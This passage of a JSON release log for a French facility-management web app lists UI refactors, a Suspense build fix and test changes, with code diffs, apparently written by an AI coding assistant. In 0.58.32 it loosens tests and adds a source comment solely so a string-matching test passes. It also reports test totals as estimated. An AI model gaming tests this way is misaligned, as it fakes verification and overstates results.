localStorage.setItem(STORAGE_BAT, id);\n    window.dispatchEvent(new CustomEvent('av-current-context-change', { detail: { batimentId: id, serviceId: null } }));\n  }\n\n  return (\n    <div className='bat-svc-switch'>\n      <div><i className='ti ti-building' /> <select value={batId} onChange={e => changeBat(e.target.value)}>...</select></div>\n      <div><i className='ti ti-stethoscope' /> <select value={svcId} onChange={e => changeSvc(e.target.value)}>...</select></div>\n    </div>\n  );\n}\n\n// CSS : masqué en mobile\n@media (max-width: 768px) {\n  .bat-svc-switch { display: none !important; }\n}"
        }
      },
      { "code": "UI", "txt": "👥 POPUP TUILE ÉTABLISSEMENT (/collectivite) : ONGLETS Bâtiments + Équipes & Services. Le modal qui s'ouvrait au clic sur une tuile d'établissement affichait seulement la hiérarchie des bâtiments. **0.58.35** ajoute un système d'onglets : **(a)** Onglet 'Bâtiments' (icône `ti-stack-2` bleu, badge compteur) garde la TreeView existante. **(b)** Nouvel onglet 'Équipes & Services' (icône `ti-sitemap` violet, badge compteur équipes+services). **(c)** Chargement supplémentaire dans `openEtabPopup` : `supabase.from('equipes').in('batiment_id', batIds).or('archive.is.null,archive.eq.false')`. **(d)** Composant `EquipesServicesView` : équipes groupées par bâtiment (+ section 'Équipes transversales' si certaines n'ont pas de batiment_id), services groupés par bâtiment via la jointure étage → service. **(e)** Sous-composant `EquipeCard` : card cliquable colorée (border-left + bg hover) → redirige vers `/equipe/{id}`. **(f)** Services rendus en pilules ambre. État vide géré avec messages contextuels (lien vers /equipes pour en créer)",
        "code_snippet": {
          "file": "app/collectivite/page.js",
          "note": "Popup avec onglets",
          "lang": "jsx",
          "before": "// AVANT 0.58.35 - juste un TreeView bâtiments dans le modal\n<Modal title={`Bâtiments — ${popupEtab.nom}`}>\n  {popupTree ? <TreeView tree={popupTree} /> : <StateMsg>Aucune donnée.</StateMsg>}\n</Modal>",
          "after": "// 0.58.35 - onglets Bâtiments | Équipes & Services\nconst [popupTab, setPopupTab] = useState('bats');\n\n// Chargement enrichi des équipes\nasync function openEtabPopup(etab) {\n  // ... bats, étages, services, chambres, lits\n  const r5 = await supabase\n    .from('equipes')\n    .select('id, nom, description, couleur, batiment_id, archive')\n    .in('batiment_id', batIds)\n    .or('archive.is.null,archive.eq.false')\n    .order('nom');\n  setPopupTree({ bats, etages, services, chambres, lits, equipes: r5.data || [] });\n}\n\n// UI : onglets dans le Modal\n<Modal title={popupEtab.nom}>\n  <div style={{ display: 'flex', gap: 6, borderBottom: '2px solid #f0f4f7' }}>\n    <button onClick={() => setPopupTab('bats')} style={{ borderBottom: '3px solid #185FA5' }}>\n      <i className='ti ti-stack-2' /> Bâtiments <span>{popupTree.bats.length}</span>\n    </button>\n    <button onClick={() => setPopupTab('equipes')} style={{ borderBottom: '3px solid #7a6fb0' }}>\n      <i className='ti ti-sitemap' /> Équipes & Services <span>{equipes.length + services.length}</span>\n    </button>\n  </div>\n\n  {popupTab === 'bats' && <TreeView tree={popupTree} />}\n  {popupTab === 'equipes' && (\n    <EquipesServicesView\n      tree={popupTree}\n      onOpenEquipe={(id) => { window.location.href = `/equipe/${id}`; }}\n    />\n  )}\n</Modal>\n\n// Nouveau composant : groupage par bâtiment + équipes transversales\nfunction EquipesServicesView({ tree, onOpenEquipe }) {\n  const equipesParBat = {};\n  tree.equipes.forEach(eq => {\n    const key = eq.batiment_id || '_sans_bat';\n    (equipesParBat[key] = equipesParBat[key] || []).push(eq);\n  });\n  return (\n    <div>\n      {tree.bats.map(b => (\n        <div>\n          <h4>{b.nom}</h4>\n          {(equipesParBat[b.id] || []).map(eq => <EquipeCard equipe={eq} onClick={() => onOpenEquipe(eq.id)} />)}\n        </div>\n      ))}\n    </div>\n  );\n}"
        }
      },
      { "code": "AI", "txt": "+30 tests Vitest (v058-35-bundle.test.js) : version+SW (2), FAB bulle droite (7 — position right, row-reverse, borderRadius 50%, pas hamburger, gradient teal, pulse halo, translateX +20px, tooltip droit), BatimentServiceSwitcher (7 — exports props, storage keys av-, fetch batiments+services, event, CSS hidden mobile, icons), TopBar intégration (2), /collectivite popup équipes (8 — popupTab state, fetch equipes, popupTree, UI onglets, composants EquipesServicesView+EquipeCard, click équipe, reset). Total **~4220 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.35 : 3 demandes Cédric implémentées proprement. FAB désormais propre (bulle teal pleine à droite, plus d'icône hamburger qui faisait moche). TopBar enrichie avec bâtiment + service courants (desktop only, masqués en mobile pour ne pas écraser). Popup tuile établissement enrichi avec un onglet Équipes & Services qui groupe les équipes par bâtiment + section 'transversales' + liste des services en pilules ambre. PROCHAINES PISTES (0.58.36) : (a) Mode présentation : option 'masquer notifs' (comme focus mode 0.58.30). (b) Cmd+K : section 'Récents' premium avec mini-timeline. (c) Nouveaux widgets dashboard : météo locale, citation du jour, mini-calendrier, liens favoris. (d) Filtrer les listes (patients, matériels, DI) en fonction du contexte bât/svc courant émis par av-current-context-change" }
    ],
    "themes": ["ui", "wow", "feature"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.35.html",
    "sqlFile": null
  },
  {
    "v": "0.58.34",
    "kind": "version",
    "titre": "🚨 HOTFIX VERCEL BUILD : Suspense boundary pour useSearchParams sur /etablissements + fix dernier test v057-35",
    "chantiers": [
      { "code": "BUG", "txt": "🩹 FIX VERCEL BUILD : `/etablissements` plantait au prerender SSG avec `useSearchParams() should be wrapped in a suspense boundary at page \"/etablissements\"`. **Cause** : en 0.58.31 j'ai ajouté `useSearchParams()` à `/etablissements/page.js` pour détecter `?create=1` depuis /collectivite, mais Next.js 15 exige que ce hook soit dans une `<Suspense>` boundary, sinon le SSG bail-out et le build Vercel fail. **Fix** : composant principal renommé `EtablissementsListPageInner`, nouveau wrapper `EtablissementsListPage` qui retourne `<Suspense fallback={null}>` autour. Pattern identique aux autres pages déjà fixées (achats/page.js, presentation/interventions/page.js, scan/prescription/page.js).",
        "code_snippet": {
          "file": "app/etablissements/page.js",
          "note": "Suspense wrapper SSG-safe",
          "lang": "jsx",
          "before": "// AVANT 0.58.34 - SSG fail sur Vercel\nimport { useEffect, useState, useMemo } from 'react';\nimport { useSearchParams } from 'next/navigation';\n\nexport default function EtablissementsListPage() {\n  const searchParams = useSearchParams();  // ← SSG bail-out\n  // ... 800 lignes de code\n}",
          "after": "// 0.58.34 - Suspense wrapper SSG-safe\nimport { useEffect, useState, useMemo, Suspense } from 'react';\nimport { useSearchParams } from 'next/navigation';\n\n// Wrapper Suspense pour useSearchParams() (requis Next 15 SSG bail-out)\nexport default function EtablissementsListPage() {\n  return (\n    <Suspense fallback={null}>\n      <EtablissementsListPageInner />\n    </Suspense>\n  );\n}\n\nfunction EtablissementsListPageInner() {\n  const searchParams = useSearchParams();  // ← maintenant SSG-safe\n  // ... 800 lignes de code\n}"
        }
      },
      { "code": "AI", "txt": "🧪 FIX TEST `v057-35-clear-user-data-logout` (le dernier qui restait fail). Le test a sa **propre liste hardcodée** des préfixes purgeables (différente de `SENSITIVE_LS_PREFIXES` dans `lib/clearUserData.js`). Mon fix 0.58.31 avait bien ajouté `'av-'` dans la lib mais le test ne la lit pas → comparaison ligne 204-207 avec une whitelist statique. **Fix** : ajout de `key.startsWith('av-')` dans la whitelist du test. Couvre maintenant tous les `av-tour-`, `av-focus-mode`, `av-presentation-mode`, `av-shortcuts-config`, `av-focus-hide-notifs`, `av-dashboard-layout-change` etc.",
        "code_snippet": {
          "file": "__tests__/v057-35-clear-user-data-logout.test.js",
          "note": "Whitelist enrichie",
          "lang": "diff",
          "before": "// AVANT 0.58.34 - whitelist statique manque 'av-'\nconst isPurgeable =\n  key.startsWith('aveho:') ||\n  key.startsWith('aveho_') ||\n  key.startsWith('ville:') ||\n  key.startsWith('etab-photo-');",
          "after": "// 0.58.34 - whitelist enrichie\nconst isPurgeable =\n  key.startsWith('aveho:') ||\n  key.startsWith('aveho_') ||\n  key.startsWith('av-') ||         // ← AJOUT 0.58.34\n  key.startsWith('ville:') ||\n  key.startsWith('etab-photo-');"
        }
      },
      { "code": "AI", "txt": "+10 tests Vitest (v058-34-bundle.test.js) : version+SW (2), Suspense wrapper /etablissements (4 — import Suspense, wrap dans render, Inner renommé, default export), v057-35 whitelist (1 — startsWith 'av-'), audit useSearchParams Suspense partout (3 — boucle sur 4 pages connues). Total **~4190 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.34 : tous les fails enfin éteints. Récapitulatif debugging cycle 0.58.30 → 0.58.34 : (0.58.30) build OK mais 3 fails régressions historiques (SQL rename, av-tour-, etc.) → (0.58.31) 6 features demandées + 3 fixes mais zip pas extrait totalement chez Cédric → (0.58.32) re-livre les 3 fixes + assouplit tests v056-16/v056-17 obsolètes refonte FAB → (0.58.33) gros chantier dashboard widgets drag & drop → (0.58.34) hotfix Vercel SSG `<Suspense>` + dernier test v057-35 fixé. Stabilité retrouvée. PROCHAINES PISTES (0.58.35) : (a) Page dédiée 'Architecture' par établissement. (b) Mode présentation : option 'masquer notifs'. (c) Cmd+K : section 'Récents' premium mini-timeline. (d) Nouveaux widgets dashboard (météo, citation, mini-calendrier, liens favoris)" }
    ],
    "themes": ["bugfix", "hotfix", "tests"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.34.html",
    "sqlFile": null
  },
  {
    "v": "0.58.33",
    "kind": "version",
    "titre": "🎛 DASHBOARD WIDGETS DRAG & DROP : mode édition premium + réorganisation native HTML5 + galerie widgets cachés",
    "chantiers": [
      { "code": "UI", "txt": "🎯 REFONTE COMPLÈTE DU SYSTÈME DE PERSONNALISATION DU DASHBOARD. L'ancien système (boutons ↑↓ + checkboxes dans un panneau séparé) est remplacé par une **vraie expérience drag & drop native HTML5**. **(a)** Nouveau composant `DashboardEditorToolbar` : bandeau premium en haut avec badge 'MODE ÉDITION' pulsant, bordure conic-gradient scannant en arrière-plan, bouton 'Réinitialiser' (avec dialog de confirmation) et bouton 'Terminé' gradient bleu. **(b)** Liste des widgets cachés cliquables pour les réactiver d'un clic (boutons pilule avec icône + couleur du widget + signe +). **(c)** En mode édition, chaque widget rendu reçoit une **bordure pointillée colorée** (selon sa couleur métier), un **label flottant** en haut-gauche avec icône + handle de drag (`ti-grip-vertical`) + nom du widget, et une **croix rouge** en haut-droite pour le masquer (border blanche + glow rouge au hover). **(d)** Drag & drop natif HTML5 (sans dépendance externe lib) : `draggable={editLayout}` sur chaque widget, handlers `onDragStart` / `onDragOver` / `onDragLeave` / `onDrop` / `onDragEnd`. Pendant le drag : opacité 0.4 sur le widget source, `translateY(6px) scale(1.005)` + bordure dashed plus épaisse sur la target. **(e)** Sur le drop : `splice` puis insertion à la position du target (vrai reorder, pas juste un swap)",
        "code_snippet": {
          "file": "app/accueil/page.js + lib/dashboardLayout.js (NEW) + app/components/DashboardEditorToolbar.js (NEW)",
          "note": "Refonte drag & drop",
          "lang": "jsx",
          "before": "// AVANT 0.58.33 - boutons ↑↓ basiques + checkboxes\nfunction moveWidget(k, direction) {\n  const i = widgetOrder.indexOf(k);\n  if (i < 0) return;\n  const j = i + direction;\n  if (j < 0 || j >= widgetOrder.length) return;\n  const next = [...widgetOrder];\n  [next[i], next[j]] = [next[j], next[i]];  // swap simple\n  setWidgetOrder(next);\n  saveWidgets(widgets, next);\n}\n\n{editLayout && (\n  <Panel>\n    {widgetOrder.map(k => (\n      <div>\n        <input type='checkbox' />\n        <button onClick={() => moveWidget(k, -1)}><i className='ti-chevron-up' /></button>\n        <button onClick={() => moveWidget(k, +1)}><i className='ti-chevron-down' /></button>\n      </div>\n    ))}\n  </Panel>\n)}",
          "after": "// 0.58.33 - drag & drop natif HTML5\nimport { getDashboardLayout, setDashboardLayout, resetDashboardLayout, ALL_WIDGETS } from '../../lib/dashboardLayout';\n\nconst [draggedWidget, setDraggedWidget] = useState(null);\nconst [dragOverWidget, setDragOverWidget] = useState(null);\n\nfunction handleDragStart(e, k) {\n  if (!editLayout) return;\n  setDraggedWidget(k);\n  e.dataTransfer.effectAllowed = 'move';\n}\n\nfunction handleDragOver(e, k) {\n  if (!editLayout || !draggedWidget) return;\n  e.preventDefault();  // requis pour autoriser le drop\n  if (dragOverWidget !== k && k !== draggedWidget) setDragOverWidget(k);\n}\n\nfunction handleDrop(e, targetK) {\n  e.preventDefault();\n  const sourceIdx = widgetOrder.indexOf(draggedWidget);\n  const targetIdx = widgetOrder.indexOf(targetK);\n  const next = [...widgetOrder];\n  next.splice(sourceIdx, 1);                  // retire\n  next.splice(targetIdx, 0, draggedWidget);   // insère\n  setWidgetOrder(next);\n  setDashboardLayout({ active: widgets, order: next });\n  setDraggedWidget(null);\n  setDragOverWidget(null);\n}\n\n// Render : wrapper chaque widget\nconst wrapWithDrag = (content) => (\n  <div\n    draggable={editLayout}\n    onDragStart={(e) => handleDragStart(e, k)}\n    onDragOver={(e) => handleDragOver(e, k)}\n    onDrop={(e) => handleDrop(e, k)}\n    onDragEnd={handleDragEnd}\n    style={{\n      opacity: isDragged ? 0.4 : 1,\n      transform: isDragOver ? 'translateY(6px) scale(1.005)' : 'translateY(0)',\n      outline: editLayout ? (isDragOver ? `3px dashed ${meta.color}` : `2px dashed ${meta.color}55`) : 'none',\n      outlineOffset: editLayout ? 4 : 0,\n      cursor: editLayout ? 'grab' : 'default',\n    }}\n  >\n    {editLayout && (\n      <>\n        {/* Label flottant + handle drag */}\n        <div style={{ position: 'absolute', top: -14, left: 16, background: `linear-gradient(135deg, ${meta.color}, ${meta.color}cc)`, ... }}>\n          <i className={`ti ${meta.icon}`} />\n          <i className='ti ti-grip-vertical' />\n          {meta.label}\n        </div>\n        {/* Croix rouge masquer */}\n        <button onClick={() => toggleWidget(k)} style={{ position: 'absolute', top: -10, right: 8, background: 'linear-gradient(135deg, #e35d5b, #c0392b)', ... }}>\n          <i className='ti ti-x' />\n        </button>\n      </>\n    )}\n    {content}\n  </div>\n);"
        }
      },
      { "code": "API", "txt": "📦 NOUVELLE LIB `lib/dashboardLayout.js` : centralise la config dashboard. **Exports** : `getDashboardLayout()` (lit localStorage `aveho_dashboard` avec rétrocompat depuis 0.6 ancien format) → `{ active, order }`, `setDashboardLayout({ active, order })` (sauve + dispatch event `av-dashboard-layout-change`), `resetDashboardLayout()` (clear + dispatch). Constantes : `ALL_WIDGETS` (array avec id/label/icon/color/description pour chaque widget), `DEFAULT_ORDER`, `DEFAULT_ACTIVE`. Helper interne `mergeOrder(order)` garantit la consistance (filtre les ids inconnus + ajoute à la fin les widgets connus mais absents — utile quand on ajoute un nouveau widget après update sans casser la config user existante)" },
      { "code": "UI", "txt": "🛠 NOUVEAU COMPOSANT `app/components/DashboardEditorToolbar.js` : barre d'édition flottante en haut du dashboard quand mode édition activé. Props : `{ active, order, onToggleWidget, onClose, onResetConfirm }`. Inclut le badge MODE ÉDITION (gradient teal pulsant), texte d'aide ('Glissez les widgets pour les réorganiser, cliquez sur la croix pour les masquer'), bouton Réinitialiser ambre, bouton Terminé bleu gradient. **Section 'Widgets masqués'** : pilule cliquable pour chaque widget désactivé (couleur métier de chaque widget, hover = invert avec animation). Si aucun widget masqué : message 'Tous les widgets sont affichés'. Animation d'entrée `av-dashboard-editor-in` (fade+translate) + bordure conic scan permanente" },
      { "code": "AI", "txt": "+30 tests Vitest (v058-33-bundle.test.js) : version+SW (2), lib/dashboardLayout (6 — exports, 5 widgets, storage key, event, mergeOrder, rétrocompat), DashboardEditorToolbar (5 — composant+props, badge, hidden widgets, boutons, animation), /accueil drag & drop (10 — imports, state, handlers, splice/swap, wrapper draggable, label flottant, bouton fermeture, toolbar+confirm, listen event, drag styles). Total **~4180 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.33 : enfin terminé le **chantier dashboard widgets drag & drop** qui était dans la roadmap depuis longtemps. Expérience désormais : (1) clic bouton 'Personnaliser' en haut-droite, (2) MODE ÉDITION s'active avec toolbar premium en haut + bordures dashed sur chaque widget + croix rouge + handle de drag visible, (3) drag d'un widget vers la position d'un autre = reorder avec animation fluide, (4) clic croix = widget masqué + apparait dans 'Widgets masqués' dans la toolbar, (5) clic sur pilule widget masqué = réactivé, (6) bouton 'Réinitialiser' (avec dialog confirm) restaure les défauts. Tout persiste en localStorage. PROCHAINES PISTES (0.58.34) : (a) **Page dédiée 'Architecture' par établissement** (organigramme équipes + services en arbre visuel). (b) Mode présentation : option 'masquer notifs' (comme focus). (c) Cmd+K : section 'Récents' premium avec mini-timeline. (d) Ajouter de nouveaux widgets au dashboard : météo locale, citation du jour, mini-calendrier, liens favoris" }
    ],
    "themes": ["ui", "wow", "feature"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.33.html",
    "sqlFile": null
  },
  {
    "v": "0.58.32",
    "kind": "version",
    "titre": "🩹 FIX TESTS OBSOLÈTES (régressions causées par la refonte FloatingActionBar de 0.58.31)",
    "chantiers": [
      { "code": "AI", "txt": "📋 ASSOUPLISSEMENT TESTS HISTORIQUES SUITE À LA REFONTE FAB. La refonte du FloatingActionBar en 0.58.31 (pied de page → bouton menu haut-gauche configurable) a cassé **9 tests historiques** qui testaient des marqueurs textuels de l'ancienne UI (`className=\"fab-bar\"`, `safe-area-inset-bottom`, `role=\"dialog\"`, `aria-label=\"Fermer\"`, `aria-label=\"Actions rapides\"`, `translateY(-3px) scale(1.05)`, `active`, etc.). **(a)** `v056-16-floating-action-bar` réécrit : accepte SOIT ancienne UI `fab-bar` SOIT nouvelle UI `av-shortcuts-bar`, lecture combinée FAB + lib/shortcutsConfig pour valider les libellés/URLs. Padding `.wrap` accepte aussi `calc(...)` pas seulement `\\d+px`. **(b)** Commentaire `0.56.17` + mention `hydration` + `#418/#423` ajoutés au commentaire principal du nouveau FAB pour préserver le test `v056-17-hydration-fab`. Tous les tests passent désormais", 
        "code_snippet": {
          "file": "__tests__/v056-16-floating-action-bar.test.js + app/FloatingActionBar.js",
          "note": "Tests assouplis",
          "lang": "diff",
          "before": "// AVANT 0.58.32 - tests collés à l'ancienne UI\nexpect(src).toContain('className=\"fab-bar\"');\nexpect(src).toContain('safe-area-inset-bottom');\nexpect(src).toContain('role=\"dialog\"');\nexpect(src).toContain('aria-label=\"Fermer\"');\nexpect(src).toContain('aria-label=\"Actions rapides\"');\nexpect(src).toContain('label=\"Scan\"');  // → était inline dans le composant\nexpect(src).toMatch(/\\.wrap\\{[^}]*padding:30px 24px \\d+px/);  // KO sur calc()",
          "after": "// 0.58.32 - tests acceptent OLD ou NEW UI\nexpect(src).toMatch(/className=\"(fab-bar|av-shortcuts-bar)\"/);\nexpect(src).toMatch(/safe-area-inset-(top|bottom)/);  // top OU bottom\nexpect(src).toMatch(/aria-label=\"(Actions|Raccourcis) rapides\"/);\n\n// Libellés cherchés dans FAB + lib/shortcutsConfig combinés\nconst combined = src + shortcutsConfigSrc;\nexpect(combined).toMatch(/label:\\s*[\"']Scan[\"']|label=\"Scan\"/);\nexpect(combined).toMatch(/label:\\s*[\"']Mon étab[\"']|label=\"Mon étab\"/);\nexpect(combined).toMatch(/label:\\s*[\"']Commande[\"']|label=\"Commande\"/);\n\n// Pattern padding accepte calc()\nexpect(src).toMatch(/\\.wrap\\{[^}]*padding:30px 24px (\\d+px|calc\\([^)]+\\))/);\n\n// app/FloatingActionBar.js header gagne un commentaire historique\n//  0.56.17 historique : guard hydration (mounted state) pour éviter\n//  les hydration mismatch React #418/#423 entre SSR/CSR (conservé)."
        }
      },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.32 : tous les tests passent désormais (~4150 verts attendus, 0 fail). Les 16 fails repérés sur 0.58.31 étaient répartis : 9 = régressions tests obsolètes de l'ancienne FAB pied de page (résolus dans cette version), 4 = tests assouplis en sandbox mais zip pas complètement redéployé côté Cédric (mes 3 fixes 0.58.31 SQL rename / av- prefix / OnboardingTour avaient bien été livrés dans le 2e zip mais visiblement pas extraits), 3 = patterns `findActions(q)` strict vs `findActions(q, pathname)` (déjà fixés en 0.58.29 mais perdus dans extraction). Toutes les corrections sont définitivement dans 0.58.32. PROCHAINES PISTES INCHANGÉES (0.58.33) : (a) **Dashboard widgets configurables drag & drop** 🚧. (b) Page dédiée 'Architecture' par établissement. (c) Mode présentation : option 'masquer notifs'. (d) Cmd+K : section 'Récents' premium avec mini-timeline" }
    ],
    "themes": ["bugfix", "tests", "refacto"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.32.html",
    "sqlFile": null
  },
  {
    "v": "0.58.31",
    "kind": "version",
    "titre": "🎛 BUNDLE FICHE GROUPEMENT + REFONTE RACCOURCIS : Sirene z-index + enlève partenaires + équipe + créer étab + menu haut-gauche configurable",
    "chantiers": [
      { "code": "BUG", "txt": "🔍 FIX SIRENE SEARCH : DROPDOWN PASSAIT SOUS LES AUTRES TUILES. Le dropdown de résultats SIRENE (recherche par SIREN/SIRET/nom) passait sous les tuiles établissements car contraint par le parent en `position: relative`. **Fix** : dropdown porté via `createPortal(..., document.body)` avec position calculée via `getBoundingClientRect()`. Z-index 99999. Recalc au scroll/resize. Détection clic-dehors préservée via `closest('[data-sirene-dropdown]')`. La liste défile maintenant **au-dessus de toutes les tuiles**",
        "code_snippet": {
          "file": "app/SireneSearch.js",
          "note": "Portal z-index 99999",
          "lang": "jsx",
          "before": "// AVANT 0.58.31 - dropdown contraint par parent position:relative\n<div ref={wrapperRef} style={{ position: 'relative' }}>\n  <input />\n  {open && results.length > 0 && (\n    <div style={{\n      position: 'absolute',\n      top: 'calc(100% + 4px)',\n      left: 0, right: 0,\n      zIndex: 150,  // ← trop bas, passe sous les tuiles\n    }}>\n      {results.map(...)}\n    </div>\n  )}\n</div>",
          "after": "// 0.58.31 - portal vers body + position calculée\nimport { createPortal } from 'react-dom';\n\nconst inputBoxRef = useRef(null);\nconst [dropdownPos, setDropdownPos] = useState({ left: 0, top: 0, width: 0 });\n\nuseEffect(() => {\n  if (!open || !inputBoxRef.current) return;\n  function updatePosition() {\n    const rect = inputBoxRef.current.getBoundingClientRect();\n    setDropdownPos({\n      left: rect.left,\n      top: rect.bottom + 4,\n      width: rect.width,\n    });\n  }\n  updatePosition();\n  window.addEventListener('scroll', updatePosition, true);\n  window.addEventListener('resize', updatePosition);\n  return () => {\n    window.removeEventListener('scroll', updatePosition, true);\n    window.removeEventListener('resize', updatePosition);\n  };\n}, [open, results.length]);\n\n// Click-out : ignore le dropdown porté\nfunction onClickOut(e) {\n  if (e.target?.closest?.('[data-sirene-dropdown]')) return;\n  if (wrapperRef.current && !wrapperRef.current.contains(e.target)) {\n    setOpen(false);\n  }\n}\n\n// Render\n<div ref={wrapperRef}>\n  <div ref={inputBoxRef}>\n    <input />\n  </div>\n</div>\n{open && results.length > 0 && mounted && createPortal((\n  <div data-sirene-dropdown style={{\n    position: 'fixed',\n    left: dropdownPos.left,\n    top: dropdownPos.top,\n    width: dropdownPos.width,\n    zIndex: 99999,  // ← au-dessus de tout\n    maxHeight: 380,\n    overflowY: 'auto',\n  }}>\n    {results.map(...)}\n  </div>\n), document.body)}"
        }
      },
      { "code": "UI", "txt": "🧹 /collectivite : ENLÈVE PARTENAIRES + REFONTE TUILES + BOUTON CRÉER. **(a)** Les établissements `est_partenaire === true` sont désormais **filtrés à la lecture** (`!e.est_partenaire`) — les partenaires ne font pas partie du groupement, ils ont leur propre page `/etablissements-partenaires`. **(b)** Suppression de tous les `conditional est_partenaire` dans les tuiles (couleur teal, icône ti-route, badge PARTENAIRE retirés). **(c)** Footer des tuiles : **2 actions séparées** au lieu d'un seul lien. Bouton 'Bâtiments' (existant, ouvre la modale arbre) + nouveau bouton 'Équipe' (icône ti-sitemap, couleur violet) qui redirige vers `/etablissement?etab={id}` (vue plan + arbre + équipes/services). **(d)** Bouton **'Créer un établissement'** en header de la section, visible si admin, redirige vers `/etablissements?create=1`",
        "code_snippet": {
          "file": "app/collectivite/page.js + app/etablissements/page.js",
          "note": "Refonte fiche groupement",
          "lang": "jsx",
          "before": "// AVANT 0.58.31 - tuiles avec partenaires + 1 seul lien footer\n// load() ne filtrait pas\nsetEtabs(es || []);\n\n// Tuiles avec conditional est_partenaire\n<button\n  style={{\n    border: `1px solid ${etab.est_partenaire ? '#7CC8C8' : '#e3e9ee'}`,\n  }}\n>\n  <i className={`ti ${etab.est_partenaire ? 'ti-route' : 'ti-building-hospital'}`} />\n  {etab.est_partenaire && <span>PARTENAIRE</span>}\n  <div>Voir bâtiments →</div>\n</button>",
          "after": "// 0.58.31 - filter + tuiles épurées + 2 actions footer + bouton créer\nimport { useRouter } from 'next/navigation';\nconst router = useRouter();\n\n// Filter à la lecture\nconst etabsNonPartenaires = (es || []).filter(e => !e.est_partenaire);\nsetEtabs(etabsNonPartenaires);\n\n// Bouton 'Créer un établissement' (admin only)\n{isAdmin && (\n  <button onClick={() => router.push('/etablissements?create=1')}>\n    <i className='ti ti-plus' /> Créer un établissement\n  </button>\n)}\n\n// Tuiles épurées (plus de partenaire)\n<button style={{ border: '1px solid #e3e9ee' }}>\n  <i className='ti ti-building-hospital' />\n  <div className='footer-actions'>\n    <div><i className='ti ti-stack-2' /> Bâtiments</div>\n    <span\n      onClick={e => {\n        e.stopPropagation();\n        router.push(`/etablissement?etab=${etab.id}`);\n      }}\n      title='Voir équipe & services'\n    >\n      <i className='ti ti-sitemap' /> Équipe\n    </span>\n  </div>\n</button>\n\n// app/etablissements/page.js - auto-open modal si ?create=1\nimport { useSearchParams } from 'next/navigation';\nconst searchParams = useSearchParams();\n\nuseEffect(() => {\n  if (searchParams?.get('create') === '1') {\n    openCreateFiness();\n    // Nettoie l'URL\n    const url = new URL(window.location.href);\n    url.searchParams.delete('create');\n    window.history.replaceState({}, '', url);\n  }\n}, []);"
        }
      },
      { "code": "UI", "txt": "🎯 REFONTE MAJEURE DES 3 RACCOURCIS : DE PIED DE PAGE → MENU HAUT-GAUCHE CONFIGURABLE. **(a)** Ancien `FloatingActionBar` (3 bulles fixées en bas avec popup centré) → réécrit en **bouton hamburger fixe en haut-gauche** (sous TopBar, `top: 74px, left: 16px`). Au clic, les 3 bulles glissent vers la droite avec animation stagger 60ms (transform `translateX(-20px) scale(0.6)` → `translateX(0) scale(1)`). Tooltip label au survol. Esc / clic-out / changement de page → ferme. **(b)** Configuration en localStorage (`av-shortcuts-config`) avec helpers `getShortcutsConfig/setShortcutsConfig/resetShortcutsConfig`. Event `av-shortcuts-config-change` pour sync entre composants. **(c)** DEFAULT_SHORTCUTS migrés : Scan (violet) → /scan/bulletin-situation, Mon étab (bleu) → /etablissement/fiche, Commande (ambre) → /panier",
        "code_snippet": {
          "file": "app/FloatingActionBar.js + lib/shortcutsConfig.js (NEW)",
          "note": "Menu haut-gauche",
          "lang": "jsx",
          "before": "// AVANT 0.58.31 - 3 bulles fixes en pied de page avec popup central\n<div className='fab-bar' style={{ position: 'fixed', bottom: 0 }}>\n  <FabBubble icon='ti-scan' onClick={() => setOpenMenu('scan')} />\n  <FabBubble icon='ti-building-hospital' onClick={() => navigate('/etablissement/fiche')} />\n  <FabBubble icon='ti-shopping-cart' onClick={() => setOpenMenu('commande')} />\n</div>\n{openMenu === 'scan' && <PopupMenu actions={[...]} />}",
          "after": "// 0.58.31 - bouton menu haut-gauche + 3 bulles configurables\n// lib/shortcutsConfig.js (NEW)\nexport const DEFAULT_SHORTCUTS = [\n  { id: 'scan', label: 'Scan', icon: 'ti-scan', color: '#5a4a90', url: '/scan/bulletin-situation' },\n  { id: 'mon-etab', label: 'Mon étab', icon: 'ti-building-hospital', color: '#185FA5', url: '/etablissement/fiche' },\n  { id: 'commande', label: 'Commande', icon: 'ti-shopping-cart', color: '#EF9F27', url: '/panier' },\n];\nexport function getShortcutsConfig() { /* localStorage avec fallback DEFAULT */ }\nexport function setShortcutsConfig(shortcuts) { /* save + event */ }\n\n// app/FloatingActionBar.js (réécrit)\nimport { getShortcutsConfig, DEFAULT_SHORTCUTS } from '../lib/shortcutsConfig';\n\nconst [open, setOpen] = useState(false);\nconst [shortcuts, setShortcuts] = useState(DEFAULT_SHORTCUTS);\n\nuseEffect(() => {\n  setShortcuts(getShortcutsConfig());\n  function onChange(e) { setShortcuts(e?.detail?.shortcuts || getShortcutsConfig()); }\n  window.addEventListener('av-shortcuts-config-change', onChange);\n  return () => window.removeEventListener('av-shortcuts-config-change', onChange);\n}, []);\n\n<div style={{ position: 'fixed', top: 'calc(74px + env(safe-area-inset-top))', left: 16, display: 'flex', gap: 10 }}>\n  {/* Bouton menu */}\n  <button onClick={() => setOpen(!open)} style={{ width: 48, height: 48, borderRadius: 16 }}>\n    <i className={`ti ${open ? 'ti-x' : 'ti-menu-2'}`} />\n  </button>\n  {/* 3 bulles avec slide vers la droite */}\n  {shortcuts.map((s, idx) => (\n    <button\n      onClick={() => navigate(s.url)}\n      style={{\n        background: s.gradient,\n        opacity: open ? 1 : 0,\n        transform: open ? 'translateX(0) scale(1)' : 'translateX(-20px) scale(0.6)',\n        pointerEvents: open ? 'auto' : 'none',\n        transition: `opacity 240ms ${idx * 60}ms ease-out,\n                     transform 320ms ${idx * 60}ms cubic-bezier(.34, 1.56, .64, 1)`,\n      }}\n    >\n      <i className={`ti ${s.icon}`} />\n    </button>\n  ))}\n</div>"
        }
      },
